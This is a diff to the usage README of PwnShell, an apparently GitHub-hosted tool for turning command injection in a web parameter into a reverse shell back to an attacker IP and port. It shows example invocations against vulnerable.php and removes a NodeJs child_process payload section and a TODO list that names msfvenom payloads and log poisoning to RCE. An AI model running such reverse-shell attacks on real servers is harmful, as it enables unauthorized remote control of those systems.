@@ -44,7 +44,7 @@
 ## Usage:
 ### Request-File Method [Recommended] 👇
 ```sh
-./pwnshell.py -H [HOST IP] -f [REQUEST FILE]
+./pwnshell.py -i [Attacker-IP] -f [REQUEST FILE] -s (To use https prefix)
 ```
 #### Example:
 -Copy from Burp or Network tab
@@ -63,12 +63,12 @@ Upgrade-Insecure-Requests: 1
 ```
 ### URL Method 👇
 ```sh
-./pwnshell.py -H [HOST-IP] -u [TARGET-URL] -m [REQUEST-METHOD] -c [COOKIES (optional)] -k [HEADERS (optional)]
+./pwnshell.py -i [Attacker-IP] -p [Attacker-Port] -u [TARGET-URL] -m [REQUEST-METHOD] -c [COOKIES (optional)] -H [HEADERS (optional)]
 
 #Note: Cookie and headers must be in JSON format (if provided).
    ```
 ```sh
-./pwnshell.py -H <HOST-IP> -u http/s://<TARGET>/vulnerable.php?cmd=PWNME --method GET --cookies '{"key" : "value"}' 
+./pwnshell.py -i [Attacker-IP] -u http/s://<TARGET>/vulnerable.php?cmd=PWNME --method GET --cookies '{"key" : "value"}' 
 ```
 #### Example:
 -Replace the Vulnerable place in the parameter with 'PWNME'
@@ -77,12 +77,6 @@ Upgrade-Insecure-Requests: 1
 ./pwnshell.py -H 127.0.0.1 -u http://10.10.10.10/vulnerable.php?cmd=PWNME
 ```
 
-### For NodeJs Payloads:
-```sh
-./pwnshell.py -H [HOST-IP] -n   
-  
-#To use only -> require('child_process').exec('Payload')
-```
 ## Preview:
 ### Using [Request-File Method]
 ![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/requestfile-demo.gif)
@@ -90,8 +84,6 @@ Upgrade-Insecure-Requests: 1
 ### Using [URL Method]
 ![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/url-demo.gif)
 
-### NodeJs Payload:
-![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/NodeJs-prev.png)
 
 <!-- CONTACT -->
 ## Contact:
@@ -108,11 +100,3 @@ Upgrade-Insecure-Requests: 1
 * [Docker Privesc Script](https://github.com/flast101/docker-privesc)
 * [SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)
 * [Burpee](https://github.com/xscorp/Burpee)
-
-### TODO:
-```sh
-1- Add support for windows.
-2- Add Msfvenom payloads.
-3- Add Post exploitation scripts for [linux/windows].
-4- Prevent CTRL + C from killing the shell.
-5- Auto log poison to RCE.
